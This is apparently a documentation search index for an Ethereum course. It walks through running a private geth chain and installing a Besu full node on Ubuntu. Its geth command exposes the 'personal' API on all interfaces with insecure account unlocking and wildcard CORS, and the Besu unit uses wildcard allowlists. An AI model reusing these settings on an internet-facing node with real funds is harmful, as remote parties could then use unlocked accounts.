to the parent block builds the chain of blocks. timestamp is the output of Unix time() function at the block's creation. This parameter helps determine if the difficulty level should be changed to maintain a consistent average block time. It also allows us to verify the order of the blocks in the chain. Then we need to initialize the geth node with the custom genesis file. In your private blockchain directory, run: geth --datadir . init genesis.json The last line of output in the console should say Successfully wrote genesis state . Now we can start the private network so we can mine blocks on the private chain. If you're on a Mac, run: geth --allow-insecure-unlock --datadir . --keystore ~/Library/ethereum/keystore --networkid 4568 --http --http.addr '0.0.0.0' --http.corsdomain \"*\" --http.port 8502 --http.api 'personal,eth,net,web3,txpool,miner' --mine --miner.etherbase=YOUR_ETHEREUM_ADDRESS_HERE If you're on Linux, run: geth --allow-insecure-unlock --datadir . --keystore ~/.ethereum/keystore --networkid 4568 --http --http.addr '0.0.0.0' --http.corsdomain \"*\" --http.port 8502 --http.api 'personal,eth,net,web3,txpool,miner' --mine --miner.etherbase=YOUR_ETHEREUM_ADDRESS_HERE Put the Ethereum address generated earlier instead of YOUR_ETHEREUM_ADDRESS_HERE . You should see something like: In a new terminal window, cd to the private directory and run: geth attach geth.ipc You should see something like this: In the console, type web3 . This will print all of the commands available via the console. If you navigate to the test-private-blockchain data directory, you will see two directories, geth and keystore . Geth is where the blockchain data will be stored and keystore will hold account information. Notice that the keystore directory is empty.","title":"Creating a private blockchain"},{"location":"S02-ethereum/M5-installing-geth/#check-your-account","text":"You can access all of your geth accounts with eth.accounts and it will print them in an array. > eth.accounts [\"0x1c29b7832ad2e4731d816e60f767777cbf374e15\", \"0x01058d7d56a216b3f1ff8f41c20ad58888424de7\"] You can check the balance of an account with the eth.getBalance() method and entering the account. > eth.getBalance(eth.accounts[0]) 0","title":"Check your account"},{"location":"S02-ethereum/M5-installing-geth/#mining-the-private-chain","text":"Since the private blockchain is maintaining consensus using proof of work, we need to mine new blocks to process transactions. To start mining, just run miner.start() . Geth needs to build a DAG before the miner starts, but once it does that it will start mining blocks on the private chain. After a few blocks are mined, stop it with miner.stop() . See this link for more information about what is going on when geth is creating a DAG. Check the ether balance of you first account now. It should contain some ether. The first geth account will default to the coinbase, or etherbase account, which is the account to which mining rewards are sent. You can check this with eth.coinbase .","title":"Mining the private chain"},{"location":"S02-ethereum/M5-installing-geth/#sending-a-transaction","text":"Now that we have some ether in our account, we can send some to another account. For this we can use the geth console and input the eth.sendTransaction() method that takes a transaction object. An ethereum transaction includes the following data: from: String - The address for the sending account. Uses the web3.eth.defaultAccount property, if not specified. to: String - (optional) The destination address of the message, left undefined for a contract-creation transaction. value: Number|String|BigNumber - (optional) The value transferred for the transaction in Wei, also the endowment if it's a contract-creation transaction. gas: Number|String|BigNumber - (optional, default: To-Be-Determined) The amount of gas to use for the transaction (unused gas is refunded). gasPrice: Number|String|BigNumber - (optional, default: To-Be-Determined) The price of gas for this transaction in wei, defaults to the mean network gas price. data: String - (optional) Either a byte string containing the associated data of the message, or in the case of a contract-creation transaction, the initialisation code. nonce: Number - (optional) Integer of a nonce. This allows to overwrite your own pending transactions that use the same nonce. To send some ether to another account, first create another account. > personal.newAccount() Next initiate the transaction by specifying the to, the from and the value. > eth.sendTransaction({to: eth.accounts[1], from: eth.accounts[0], value: 100}) But this throws an error! Error: authentication needed: password or unlock . Geth requires that you unlock your account to send transactions from the account. > personal.unlockAccount(eth.accounts[0]) Unlock account 0xabc... true Now you can send a transaction from account 0. > eth.sendTransaction({to: eth.accounts[1], from: eth.accounts[0], value: 100}) INFO [09-10|17:54:38.360] Setting new local account address=0x1c29B7832aD2E4731D816E60f767777CbF374E15 INFO [09-10|17:54:38.361] Submitted transaction fullhash=0xdec2391ee28a7997567e5176de995340cf09fd64dc823414f6bf763b1fd1e6ed recipient=0x01058d7d56a216B3F1FF8f41c20ad58888424dE7 \"0xdec2391ee28a7997567e5176de995340cf09fd64dc823414f6bf763b1fd1e6ed\" Check the balance of account 1. > eth.getBalance(eth.accounts[1]) 0 It's still zero, because we are not running the miner. Start mining to process the transaction. You can stop mining after geth creates a block. Check the balance of account 1 again. > eth.getBalance(eth.accounts[1]) 100 It should say 100! You have successfully sent a transaction from one account to another over your single node Ethereum network!","title":"Sending a transaction"},{"location":"S02-ethereum/M5-installing-geth/#additional-materials","text":"Running Geth in dev Mode - an optimized way to run a single node for developing locally","title":"Additional Materials"},{"location":"S02-ethereum/M6-Installing-besu/","text":"Install a Full Besu Node using Bonsai Storage on Ubuntu Server Who is this guide for This guide is geared toward those who wish to set up an Ethereum Layer-1 node on a dedicated machine. This guide does not discuss using Docker or running this in a virtual machine. The example node software here is using Besu , however, installating other clients such as Erigon, Geth, OpenEthereum or others will utilise a lot of the same concepts. Future material may cover specific setups for the other clients. Something important to consider when running a node is client diversity . Having diversity is important for stability of the network, specifically in the event a flaw is found in one of the clients. If those nodes had to go offline to prevent exploits, the others can continue unaffected. To see a breakdown of known clients (not all nodes appear here, but it illustrates diversity) go to etherenodes.org . Why run a node? Contribute to the network and broader ecosystem Be your own bank send your own transactions via your node validate your account state is correct - trustless not be concerned with DNS exploited RPC urls Gain insight into what it takes learning something along the way (hopefully) TL;DR Prerequisites Install the Operating system Configure drives (and possibly mount) Install software ( Java and Besu ) Create a service file (stop start and enable) Monitor and be patient Hardware requirements and future thoughts When considering hardware, there are a number of important factors: Minimum requirements for syncing and maintaining sync. How soon do you want the node to be up and running? ( Faster storage and CPU ) How long do you intend on running the node for? What kind of node you are running Besu Node Types . Note: Other clients (e.g. Geth) may have similar and additional options. How much traffic are you personally/or your business intending on sending to the node? (can the node support many concurrent users) With everything cost is always a factor. Please consider these questions carefully weighing up future extension, whether it be storage space or CPU speed. Disk space upgrades will more than likely be the only real concern if the CPU is able to process transactions fast enough. Do you have internet speed/data allowance concerns? All of the considerations above will affect your choice in hardware and if you are able to successfully run a node. You will need at least 8GB of RAM and a fast hard drive SSD/mSATA/NVME - Sata HDDs are too slow to maintain and get to sync. Depending on your storage configuration, swap space/virtual memory may be on the same disk making HDDs even less of an option. External USB3.x SSDs have also been used to sync. Weigh up disk speed, cost, longevity, and size. At end of June 2022, a currently sync'd node with fast sync Bonsai storage is using 611GB and a Full non-Bonsai fast sync node is 980GB and growing. CPU is a bottlenecking factor - As an example, A Raspberry PI 4 overclocked to 2.147ghz sat at 100% for +-4 weeks syncing, whereas a Celeron G3930 took 10 days to sync. While it is possible to sync with a Raspberry PI, a vast amount of patience is required. As the chain grows in size, this time will increase, so depending on your timelines and usage, a Raspberry Pi may not be for you. Note: When rollups and sharding come into play, this may require a rethink, as CPU may need to be faster to keep up when processing rollups. With EIP-4844 coming down the track (eta unknown), an installation may run out of storage space where you will require easily an additional 2.2TB (+-) of storage ( 10mb * 5 blocks per min * 60 mins per hour * 24hrs a day * 30 days ) - you can get away with a 2TB disk to start, but will/may need more when it eventually happens depending on implementation. Note: the estimates here and implementation is speculative. Note If you run something like Geth, you can also run a \"light node\" All node types vs. a Full or Archive Node 5. If you are expecting many users to access your node through MetaMask or other wallets vs. just a few home users, more resources are recommended for processing and data access. Installation Tools/Software Storage drive for installation of operating system ( MicroSD for a Raspberry PI ) Optional drive for Node data USB stick for installing Software for creating a bootable USB Balena Etcher (Cross platform) or if you prefer Rufus (Windows only) Operating System Download an appropriate server install image Ubuntu Downloads with the matching architecture (ARM is available as another option). If you do decide to try it on a Raspberry Pi, the images can be found at Ubuntu for Raspberry Pi and the install process for ARM will need to be used. Installing on a Raspberry Pi burn the image to the MicroSD put it in the Pi start the Pi and follow any configuration steps Installing on a dedicated non-Pi machine Create a bootable USB stick with the operating system Mac Ubuntu Windows Set your machine's BIOS to boot from the USB Boot from the USB Install the operating system enabling SSH Install Step by Step . You won't need to install any snaps. The default file format is ext4 , if you prefer xfs works as well When creating a user, this will be your admin user, once installation is complete and the server rebooted, a specific user will be created to run Besu with. Initial OS Post-Installation Steps (both Pi and Non-Pi) Upgrades - Update and upgrade to make sure you have the latest packages ( sudo apt update && sudo apt upgrade -y && sudo reboot ) Utilities Install some basic utilities for networking and disk monitoring ( sudo apt install net-tools dstat jq -y ) net-tools (for basic networking tools) dstat (to monitor disk usage) jq for nicely formatting RPC responses Networking This assumes a wired network connection In order to make life easier when accessing your node/machine from other machines in the network or via SSH, it is advisable to set up a static IP Address. - Configure a static IP on your router for the MAC address if you are able to - To see your current IP address type in ifconfig - you should see something like eth0 or enp0s31f6 and a value next to inet for your IP - your MAC should be next to ether inet 192.168.85.6 netmask 255.255.255.0 broadcast 192.168.85.255 inet6 fe23::7223:c2ff:fe69:81aa prefixlen 64 scopeid 0x20<link> ether 50:a5:c2:6a:81:12 txqueuelen 1000 (Ethernet) - Assign a static private IP address to your node with netplan ( see example below ) - Edit your network configuration file (your name may differ) to create a static address for easy access ( sudo nano /etc/netplan/ ) - note the spacing is critical. If done, and using nano press control-o and then after, press enter to save, followed by control-x to exit - see netplan for more instructions if you get stuck or want to know about wireless configuration An example: In /etc/netplan/50-cloud-init.yaml (your name may be different - check ls /etc/netplan to find yours) Note: spacing in the yaml file is critical and needs to be maintained, else you might encounter errors such as Invalid YAML at /etc/netplan/50-cloud-init.yaml line 7 column 6: did not find expected key network : version : 2 ethernets : enp0s31f6 : addresses : - 192.168 . 50.18 / 24 nameservers : addresses : [ 192.168 . 50.1 ] routes : - to : default via : 192.168 . 50.1 Press sudo netplan apply to set the changes immediately (you may be disconnected if you are on another address) These changes should persist post reboot Disk management Disk allocation - If you are using an internal SSD, check all the space on the disk has been allocated ( df -ha ) You should see something like /dev/mapper/ubuntu--vg-ubuntu--lv 109G 7.8G 96G 8% / If this does not match your drive size, you might consider extending the space: USE WITH CAUTION Extend your lvm space If using an internal disk add a folder to contain node data ( sudo mkdir /besu ) If using an external disk Format and mount an external drive The main steps for this - Plug the external drive in - Type sudo fdisk -l - this should show you a list of devices - e.g. Disk /dev/sdb: 1.82 TiB, 2000398934016 bytes, 3907029168 sectors Disk model: Portable SSD T5 Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 33553920 bytes Once worked out which is your disk (e.g. /dev/sdb here) - sudo mkfs.xfs /dev/sdb see all formatting options - follow the prompts pressing yes where you need to ( be sure it is the correct drive ) You should see output similar to: mkfs.xfs /dev/sdb meta-data=/dev/sdb isize=512 agcount=4, agsize=5242880 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=20971520, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=10240, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 add a ssd mount directory to the system sudo mkdir /mnt/ssd mount the drive to the folder sudo mount /dev/sdb /mnt/ssd add a folder to contain node data ( sudo mkdir /mnt/ssd/besu ) To make this mounting will persist on reboot: type sudo blkid - you should see entries similar to: /dev/sdb: UUID=\"b8222ca7-29dd-44c0-be50-7ffcc3348c14\" TYPE=\"LVM2_member\" PARTUUID=\"1e95b59d-4481-4e04-a016-24a099e7ae64\" or /dev/sdb: UUID=\"b8222ca7-29dd-44c0-be50-7ffcc3348c14\" PARTUUID=\"1e95b59d-4481-4e04-a016-24a099e7ae64\" find the UUID that matches your device and copy the UUID (not quotes) type sudo nano /etc/fstab where you will store the reboot settings add a line at the bottom UUID=b8222ca7-29dd-44c0-be50-7ffcc3348c14 /mnt/ssd xfs defaults 0 0 replacing the UUID with yours press control-o and then after, press enter to save, followed by control-x to exit reboot to confirm changes and auto-mounting sudo reboot when rebooted and logged in type df -ha and you should see entries similar to the following ( last line ) Filesystem Size Used Avail Use% Mounted on sysfs 0 0 0 - /sys proc 0 0 0 - /proc udev 5.7G 0 5.7G 0% /dev devpts 0 0 0 - /dev/pts /dev/sdb 1.9T 0G 1.9T 0% /mnt/ssd Adjusting Swap space Depending on how many disks you have installed and if they are internal/external, the pathing instructions below would need to be adjusted see full instructions - Swap space on some installs are added by default ( not on the Pi ), follow this if you want extra swap space - Replace /swapfile below with /mnt/ssd/swapfile if you want to use the external drive - i.e if the Pi is using a slower MicroSD - Add swap space (generally a 1:1 with physical memory depending on how much you have) sudo fallocate -l 8G /swapfile (or sudo fallocate -l 8G /swapfile ) - Set permissions sudo chmod 600 /swapfile or /mnt/ssd/swapfile - Convert the file to swap sudo mkswap /swapfile or /mnt/ssd/swapfile - Turn it on sudo swapon /swapfile or /mnt/ssd/swapfile - Open the boot file to turn it on at reboot sudo nano /etc/fstab ( you may notice an existing swap.img file already created matching your memory) - Add an entry at the bottom /swapfile swap swap defaults 0 0 - then Control-o , Enter and Control-x to save and quit - Show the swap space available sudo swapon --show BESU BUILD AND INSTALL STEPS At this point, you should have an updated machine with swap space, a custom user to run the process under and a disk that is ready to go. check for java ( java --version ) - this should either give you a version or tell what versions are available to install install java with a current version ( sudo apt install openjdk-17-jre-headless -y ) ( or a higher version ) For Raspberry Pi see: Oracle and Java.net sdkman adoptium Follow the instructions there Once installed - check for java ( java --version ) to make sure it installed Summarised build steps - install dependencies : sudo apt install libsodium23 libnss3 - y - make a folder for code : mkdir ~/ code - navigate to the folder : cd ~/ code - clone the source code : git clone -- recursive https : // github . com / hyperledger / besu - navigate to source : cd besu - switch to a release branch ( to find these type : git branch - r ) e . g . git checkout release - 22 . 4 . 0 or stay on main for latest To see all of the gradle tasks that are available ( or just skip to installDist ) cd besu ( if not already ) . / gradlew installDist ( wait for it to complete ) Install Steps Once the build steps are complete Copy the besu folder from the build folder to /usr/bin/ e.g. sudo cp -r ~/code/besu/build/install/besu /usr/bin/besu Check your besu version /usr/bin/besu/bin/besu --version Add user to run the process under e.g. sudo useradd username ( e.g. sudo useradd eth ) - for more in depth options on users: Creating users with useradd If using an internal disk - Assign ownership of the besu folder sudo chown -R eth:eth /besu (replace eth with your chosen username) - this is needed to create and maintain files If using a mounted disk - Assign ownership of the besu folder sudo chown -R eth:eth /mnt/ssd/besu - this is needed to create and maintain files Create a Service/Unit File type in sudo nano /etc/systemd/system/besu.service paste in the below after changing the following values: --sync-mode=FAST will create a non-archive node - use --sync-mode=FULL if you want the archive option change 192.168.50.18 to the earlier set IP in order to use it in your local network change YourIdentity to something that you want to use to identify your node --p2p-host can be changed to an external IP if fixed for discovery - default is 0.0.0.0 --data-path= should point to where you want to store the data ( /besu or /mnt/ssd/besu ) [Unit] Description = Besu daemon After = network-online.target Wants = network-online.target [Service] PermissionsStartOnly = true ExecStart = /usr/bin/besu/bin/besu --host-allowlist=\"*\" --data-storage-format=BONSAI --sync-mode=FAST --identity=YourIdentity --data-path=/mnt/ssd/besu --rpc-http-enabled --rpc-http-host=192.168.50.18 --rpc-http-port=8545 --rpc-http-cors-origins=\"*\" --nat-method=NONE --p2p-host=0.0.0.0 Restart = on-failure TimeoutStopSec = 600 # Directory creation and permissions #################################### User = eth Group = eth PrivateTmp = true # Mount /usr, /boot/ and /etc read-only for the process. ProtectSystem = full # Deny access to /home, /root and /run/user ProtectHome = true # Disallow the process and all of its children to gain new privileges # through execve(). NoNewPrivileges = true # Use a new /dev namespace only populated with API pseudo devices such as # /dev/null, /dev/zero and /dev/random. PrivateDevices = true [Install] WantedBy = multi-user.target press control-o and then after, press enter to save, followed by control-x to exit type sudo systemctl start besu - this should start the service type sudo systemctl status besu - this should show you the status - similar to: \u25cf besu . service - Besu daemon Loaded : loaded ( / etc / systemd / system / besu . service ; enabled ; vendor preset : enabled ) Active : active ( running ) since Sun 2022 - 06 - 26 19 : 37 : 21 UTC ; 15 h ago Main PID : 726 ( java ) Tasks : 78 ( limit : 13869 ) Memory : 10.6 G CPU : 9 h 5 min 48.784 s CGroup : / system . slice / besu . service \u2514\u2500 726 java - Dvertx . disableFileCPResolving = true - Dbesu . home =/ usr / bin / besu - Dlog4j . shutdownHookEnabled = false - Dlog4j2 . formatMsgNoLookups = true - Djava . util . logging . manager = org . apache . logging . log4j . jul . LogManager -- add - opens java . base / sun . security . provider = ALL - UNNAMED -- add - opens java . base / java . util = ALL - UNNAMED - Dio . netty . tryReflectionSetAccessible = true -- add - exports java . base / jdk . internal . misc = ALL - UNNAMED -- add - ope > type sudo systemctl enable besu - this will let it start on reboot Monitoring the service - type tail -f /var/log/syslog to follow the logs control-c to exit - type sudo systemctl status besu to see if it is running - type dstat to see the disk usage - if it sits at 0 for a long time it may be stalled - create a get block script - type sudo nano getBlock.sh - paste in the following changing the IP address (192.168.50.18) to your server IP ``` #!/bin/bash val=$(curl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":51}' http://192.168.50.18:8545 --silent | jq -r '.result') echo $(($val)) ``` press control-o and then after, press enter to save, followed by control-x to exit type sudo chmod +x getBlock.sh to allow it to be executed to run it type ./getBlock.sh - this will tell you how far it has gotten additional commands you can create scripts with (e.g. eth_syncing ) - see API Connecting to your node with Metamask You should, once your node has synced (you should be seeing lines like the below one) be able to connect to Metamask locally: Jul 6 00:15:37 besutestbed besu[124324]: 2022-07-06 00:15:37.663+00:00 | EthScheduler-Workers-2 | INFO | PersistBlockTask | Imported #15,085,695 / 17 tx / 0 om / 1,828,694 (6.1%) gas / (0x22135e43ea450cf089fe8d0916a82a3598516badc9363df7bc8e86b1dfbf71da) in 0.289s. Peers: 54 Create a new connection under settings, give the ChainId as 1, node address as http://YOURIP:8545 and a name. You can also add the Symbol as ETH. Android Metamask Mobile requires an https site - another article will show you how to create a reverse proxy to your node. All other Metamask mobile and desktop ones work without the https. Final thoughts and security considerations Ports and port forwarding It is possible to sync without opening external ports into your network, however this means all peer initiation and finding will purely be from your node, which potentially will be slower. If you do decided to open a port and forward it into your network, it should only ever be port 30303 for peering . As with any port opening and forwarding, do so with caution. What is port forwarding . You might consider adding in a firewall to be more secure. Segementing internal networks If you are up for more advanced networking and your hardware supports it, you could consider creating different VLANs on your network disallowing the node to talk out to your internal network, but you can talk into it to use it as your RPC endpoint for your wallet (e.g. Metamask). Publicly exposed IP Addresses If you are a home user running a node, please keep in mind that your IP address will be visible to other node operators giving them a rough idea of your geolocation. Additionally, if your port forwarding is open, sites such as ethernodes will index your IP. From a privacy perspective, you may want to run your node over a dedicated IP VPN. Keep in mind this may require other hardware and technical skill. Outdate software and operating system always check for and apply updates sudo apt update && sudo apt upgrade -y Future Considerations EIP-4844 - 30 days worth of 10mb rolled up data Resources https://consensys.net/blog/news/bonsai-tries-a-big-update-for-small-state-storage-in-hyperledger-besu/ https://besu.hyperledger.org/en/stable/HowTo/Get-Started/Installation-Options/Options/ https://wiki.hyperledger.org/display/BESU/Building+from+source https://blog.developerdao.com/eip-4844-and-its-impact-on-ethereum-scalability https://www.freedesktop.org/software/systemd/man/systemd.exec.html https://netplan.io/examples/ https://ubuntu.com/server/docs/install/step-by-step https://linuxize.com/post/how-to-add-swap-space-on-ubuntu-20-04/ https://linuxize.com/post/how-to-create-users-in-linux-using-the-useradd-command/ https://cybernews.com/what-is-vpn/port-forwarding/ https://ethernodes.org/ https://besu.hyperledger.org/en/stable/Reference/API-Methods/","title":"Install a Full Besu Node using Bonsai Storage on Ubuntu Server"},{"location":"S02-ethereum/M6-Installing-besu/#install-a-full-besu-node-using-bonsai-storage-on-ubuntu-server","text":"","title":"Install a Full Besu Node using Bonsai Storage on Ubuntu Server"},{"location":"S02-ethereum/M6-Installing-besu/#who-is-this-guide-for","text":"This guide is geared toward those who wish to set up an Ethereum Layer-1 node on a dedicated machine. This guide does not discuss using Docker or running this in a virtual machine. The example node software here is using Besu , however, installating other clients such as Erigon, Geth, OpenEthereum or others will utilise a lot of the same concepts. Future material may cover specific setups for the other clients. Something important to consider when running a node is client diversity . Having diversity is important for stability of the network, specifically in the event a flaw is found in one of the clients. If those nodes had to go offline to prevent exploits, the others can continue unaffected. To see a breakdown of known clients (not all nodes appear here, but it illustrates diversity) go to etherenodes.org .","title":"Who is this guide for"},{"location":"S02-ethereum/M6-Installing-besu/#why-run-a-node","text":"Contribute to the network and broader ecosystem Be your own bank send your own transactions via your node validate your account state is correct - trustless not be concerned with DNS exploited RPC urls Gain insight into what it takes learning something along the way (hopefully)","title":"Why run a node?"},{"location":"S02-ethereum/M6-Installing-besu/#tldr","text":"Prerequisites Install the Operating system Configure drives (and possibly mount) Install software ( Java and Besu ) Create a service file (stop start and enable) Monitor and be patient","title":"TL;DR"},{"location":"S02-ethereum/M6-Installing-besu/#hardware-requirements-and-future-thoughts","text":"When considering hardware, there are a number of important factors: Minimum requirements for syncing and maintaining sync. How soon do you want the node to be up and running? ( Faster storage and CPU ) How long do you intend on running the node for? What kind of node you are running Besu Node Types . Note: Other clients (e.g. Geth) may have similar and additional options. How much traffic are you personally/or your business intending on sending to the node? (can the node support many concurrent users) With everything cost is always a factor. Please consider these questions carefully weighing up future extension, whether it be storage space or CPU speed. Disk space upgrades will more than likely be the only real concern if the CPU is able to process transactions fast enough. Do you have internet speed/data allowance concerns? All of the considerations above will affect your choice in hardware and if you are able to successfully run a node. You will need at least 8GB of RAM and a fast hard drive SSD/mSATA/NVME - Sata HDDs are too slow to maintain and get to sync. Depending on your storage configuration, swap space/virtual memory may be on the same disk making HDDs even less of an option. External USB3.x SSDs have also been used to sync. Weigh up disk speed, cost, longevity, and size. At end of June 2022, a currently sync'd node with fast sync Bonsai storage is using 611GB and a Full non-Bonsai fast sync node is 980GB and growing. CPU is a bottlenecking factor - As an example, A Raspberry PI 4 overclocked to 2.147ghz sat at 100% for +-4 weeks syncing, whereas a Celeron G3930 took 10 days to sync. While it is possible to sync with a Raspberry PI, a vast amount of patience is required. As the chain grows in size, this time will increase, so depending on your timelines and usage, a Raspberry Pi may not be for you. Note: When rollups and sharding come into play, this may require a rethink, as CPU may need to be faster to keep up when processing rollups. With EIP-4844 coming down the track (eta unknown), an installation may run out of storage space where you will require easily an additional 2.2TB (+-) of storage ( 10mb * 5 blocks per min * 60 mins per hour * 24hrs a day * 30 days ) - you can get away with a 2TB disk to start, but will/may need more when it eventually happens depending on implementation. Note: the estimates here and implementation is speculative. Note If you run something like Geth, you can also run a \"light node\" All node types vs. a Full or Archive Node","title":"Hardware requirements and future thoughts"},{"location":"S02-ethereum/M6-Installing-besu/#5-if-you-are-expecting-many-users-to-access-your-node-through-metamask-or-other-wallets-vs-just-a-few-home-users-more-resources-are-recommended-for-processing-and-data-access","text":"","title":"5. If you are expecting many users to access your node through MetaMask or other wallets vs. just a few home users, more resources are recommended for processing and data access."},{"location":"S02-ethereum/M6-Installing-besu/#installation","text":"","title":"Installation"},{"location":"S02-ethereum/M6-Installing-besu/#toolssoftware","text":"Storage drive for installation of operating system ( MicroSD for a Raspberry PI ) Optional drive for Node data USB stick for installing Software for creating a bootable USB Balena Etcher (Cross platform) or if you prefer Rufus (Windows only)","title":"Tools/Software"},{"location":"S02-ethereum/M6-Installing-besu/#operating-system","text":"Download an appropriate server install image Ubuntu Downloads with the matching architecture (ARM is available as another option). If you do decide to try it on a Raspberry Pi, the images can be found at Ubuntu for Raspberry Pi and the install process for ARM will need to be used.","title":"Operating System"},{"location":"S02-ethereum/M6-Installing-besu/#installing-on-a-raspberry-pi","text":"burn the image to the MicroSD put it in the Pi start the Pi and follow any configuration steps","title":"Installing on a Raspberry Pi"},{"location":"S02-ethereum/M6-Installing-besu/#installing-on-a-dedicated-non-pi-machine","text":"Create a bootable USB stick with the operating system Mac Ubuntu Windows Set your machine's BIOS to boot from the USB Boot from the USB Install the operating system enabling SSH Install Step by Step . You won't need to install any snaps. The default file format is ext4 , if you prefer xfs works as well When creating a user, this will be your admin user, once installation is complete and the server rebooted, a specific user will be created to run Besu with.","title":"Installing on a dedicated non-Pi machine"},{"location":"S02-ethereum/M6-Installing-besu/#initial-os-post-installation-steps-both-pi-and-non-pi","text":"","title":"Initial OS Post-Installation Steps (both Pi and Non-Pi)"},{"location":"S02-ethereum/M6-Installing-besu/#upgrades","text":"","title":"Upgrades"},{"location":"S02-ethereum/M6-Installing-besu/#-update-and-upgrade-to-make-sure-you-have-the-latest-packages-sudo-apt-update-sudo-apt-upgrade-y-sudo-reboot","text":"","title":"- Update and upgrade to make sure you have the latest packages (sudo apt update &amp;&amp; sudo apt upgrade -y &amp;&amp; sudo reboot)"},{"location":"S02-ethereum/M6-Installing-besu/#utilities","text":"Install some basic utilities for networking and disk monitoring ( sudo apt install net-tools dstat jq -y ) net-tools (for basic networking tools) dstat (to monitor disk usage) jq for nicely formatting RPC responses","title":"Utilities"},{"location":"S02-ethereum/M6-Installing-besu/#networking","text":"This assumes a wired network connection In order to make life easier when accessing your node/machine from other machines in the network or via SSH, it is advisable to set up a static IP Address. - Configure a static IP on your router for the MAC address if you are able to - To see your current IP address type in ifconfig - you should see something like eth0 or enp0s31f6 and a value next to inet for your IP - your MAC should be next to ether inet 192.168.85.6 netmask 255.255.255.0 broadcast 192.168.85.255 inet6 fe23::7223:c2ff:fe69:81aa prefixlen 64 scopeid 0x20<link> ether 50:a5:c2:6a:81:12 txqueuelen 1000 (Ethernet) - Assign a static private IP address to your node with netplan ( see example below ) - Edit your network configuration file (your name may differ) to create a static address for easy access ( sudo nano /etc/netplan/ ) - note the spacing is critical. If done, and using nano press control-o and then after, press enter to save, followed by control-x to exit - see netplan for more instructions if you get stuck or want to know about wireless configuration An example: In /etc/netplan/50-cloud-init.yaml (your name may be different - check ls /etc/netplan to find yours) Note: spacing in the yaml file is critical and needs to be maintained, else you might encounter errors such as Invalid YAML at /etc/netplan/50-cloud-init.yaml line 7 column 6: did not find expected key network : version : 2 ethernets : enp0s31f6 : addresses : - 192.168 . 50.18 / 24 nameservers : addresses : [ 192.168 . 50.1 ] routes : - to : default via : 192.168 . 50.1 Press sudo netplan apply to set the changes immediately (you may be disconnected if you are on another address) These changes should persist post reboot","title":"Networking"},{"location":"S02-ethereum/M6-Installing-besu/#disk-management","text":"Disk allocation - If you are using an internal SSD, check all the space on the disk has been allocated ( df -ha ) You should see something like /dev/mapper/ubuntu--vg-ubuntu--lv 109G 7.8G 96G 8% / If this does not match your drive size, you might consider extending the space: USE WITH CAUTION Extend your lvm space","title":"Disk management"},{"location":"S02-ethereum/M6-Installing-besu/#if-using-an-internal-disk","text":"add a folder to contain node data ( sudo mkdir /besu )","title":"If using an internal disk"},{"location":"S02-ethereum/M6-Installing-besu/#if-using-an-external-disk","text":"Format and mount an external drive The main steps for this - Plug the external drive in - Type sudo fdisk -l - this should show you a list of devices - e.g. Disk /dev/sdb: 1.82 TiB, 2000398934016 bytes, 3907029168 sectors Disk model: Portable SSD T5 Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 33553920 bytes Once worked out which is your disk (e.g. /dev/sdb here) - sudo mkfs.xfs /dev/sdb see all formatting options - follow the prompts pressing yes where you need to ( be sure it is the correct drive ) You should see output similar to: mkfs.xfs /dev/sdb meta-data=/dev/sdb isize=512 agcount=4, agsize=5242880 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=20971520, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=10240, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 add a ssd mount directory to the system sudo mkdir /mnt/ssd mount the drive to the folder sudo mount /dev/sdb /mnt/ssd add a folder to contain node data ( sudo mkdir /mnt/ssd/besu ) To make this mounting will persist on reboot: type sudo blkid - you should see entries similar to: /dev/sdb: UUID=\"b8222ca7-29dd-44c0-be50-7ffcc3348c14\" TYPE=\"LVM2_member\" PARTUUID=\"1e95b59d-4481-4e04-a016-24a099e7ae64\" or /dev/sdb: UUID=\"b8222ca7-29dd-44c0-be50-7ffcc3348c14\" PARTUUID=\"1e95b59d-4481-4e04-a016-24a099e7ae64\" find the UUID that matches your device and copy the UUID (not quotes) type sudo nano /etc/fstab where you will store the reboot settings add a line at the bottom UUID=b8222ca7-29dd-44c0-be50-7ffcc3348c14 /mnt/ssd xfs defaults 0 0 replacing the UUID with yours press control-o and then after, press enter to save, followed by control-x to exit reboot to confirm changes and auto-mounting sudo reboot when rebooted and logged in type df -ha and you should see entries similar to the following ( last line ) Filesystem Size Used Avail Use% Mounted on sysfs 0 0 0 - /sys proc 0 0 0 - /proc udev 5.7G 0 5.7G 0% /dev devpts 0 0 0 - /dev/pts /dev/sdb 1.9T 0G 1.9T 0% /mnt/ssd Adjusting Swap space Depending on how many disks you have installed and if they are internal/external, the pathing instructions below would need to be adjusted see full instructions - Swap space on some installs are added by default ( not on the Pi ), follow this if you want extra swap space - Replace /swapfile below with /mnt/ssd/swapfile if you want to use the external drive - i.e if the Pi is using a slower MicroSD - Add swap space (generally a 1:1 with physical memory depending on how much you have) sudo fallocate -l 8G /swapfile (or sudo fallocate -l 8G /swapfile ) - Set permissions sudo chmod 600 /swapfile or /mnt/ssd/swapfile - Convert the file to swap sudo mkswap /swapfile or /mnt/ssd/swapfile - Turn it on sudo swapon /swapfile or /mnt/ssd/swapfile - Open the boot file to turn it on at reboot sudo nano /etc/fstab ( you may notice an existing swap.img file already created matching your memory) - Add an entry at the bottom /swapfile swap swap defaults 0 0 - then Control-o , Enter and Control-x to save and quit - Show the swap space available sudo swapon --show","title":"If using an external disk"},{"location":"S02-ethereum/M6-Installing-besu/#besu-build-and-install-steps","text":"At this point, you should have an updated machine with swap space, a custom user to run the process under and a disk that is ready to go. check for java ( java --version ) - this should either give you a version or tell what versions are available to install install java with a current version ( sudo apt install openjdk-17-jre-headless -y ) ( or a higher version ) For Raspberry Pi see: Oracle and Java.net sdkman adoptium Follow the instructions there Once installed - check for java ( java --version ) to make sure it installed","title":"BESU 